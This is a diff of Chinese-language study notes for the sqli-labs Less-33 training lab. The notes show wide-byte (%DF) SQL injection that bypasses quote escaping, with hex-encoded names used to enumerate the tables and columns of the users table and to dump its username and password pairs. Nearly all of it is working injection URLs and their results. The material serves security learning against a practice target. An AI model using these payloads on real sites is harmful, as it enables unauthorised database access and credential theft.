@@ -30,11 +30,21 @@ http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,database(),3 --+
 数据库名：security
 
 3.表名
-http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3 --+
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),3 --+
+但因为'security'中单引号会被转义，所以并不会成功
+在这种情况下（添加转移字符的情况），能使用十六进制就不要使用单引号
+security的十六进制为0x7365637572697479
+故
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479),3 --+
 表名：users,uagents,emails,referers
 
 4.字段名
-http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),3 --+
-但因为'security'中单引号会被转义，所以现在也没想好怎么爆，先睡了，期待茅塞顿开- -
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),3 --+
+(users十六进制0x7573657273)
+字段名：
+id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
 
 5.字段值
+http://10.0.2.15/sqli/Less-33/?id=0%DF' union select 1,(select group_concat(username,0x3a,password) from users),3 --+
+字段值：
+Dumb:1,Angelina:1,Dummy:1,secure:1,stupid:1,superman:1,batman:1,admin:123,admin1:1,admin2:1,admin3:1,dhakkan:1,admin4:1
